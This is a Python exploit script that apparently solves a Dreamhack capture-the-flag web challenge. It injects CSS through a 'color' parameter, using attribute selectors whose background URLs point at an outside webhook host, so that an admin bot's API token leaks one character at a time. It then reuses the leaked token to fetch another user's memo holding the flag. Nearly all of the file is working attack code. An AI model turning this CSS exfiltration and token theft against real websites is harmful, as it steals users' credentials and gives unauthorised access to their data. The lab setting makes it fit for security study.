import requests
from urllib.parse import quote
import string
import re

url = 'http://host3.dreamhack.games:10884/'
s = requests.Session()

creds = {
    'username': 'hacked',
    'password': 'hacked'
}

res = s.post(f'{url}/register', data=creds)
res = s.post(f'{url}/login', data=creds)

assert 'Username :' in res.text
print("> Logged in")

webhook = 'https://ijvbmwd.request.dreamhack.games'

def build_payload(prefix):
    payload = ''

    for c in string.ascii_lowercase:
        guess = prefix + c
        payload += '#InputApitoken[value^=%s]{background:url(%s)}' % (guess, f'{webhook}/{guess}')

    payload = '''a;}%s{''' % payload

    return payload

def leak_token(token):
    res = s.post(f'{url}/report', data={
        'path': f'/mypage?color={quote(build_payload(token))}'
    })

    assert 'success' in res.text.lower()
    print("> Reported payload")

def get_flag(token):
    res = s.get(f'{url}/api/memo', headers={
        'API-KEY': token
    }, params={
        'uid': 0
    })

    flag = re.findall(r'(DH{.+}?)', res.text)[0].strip()
    return flag

token = 'eznimasp'

# leak_token(token)

flag = get_flag(token)
print("Flag:", flag)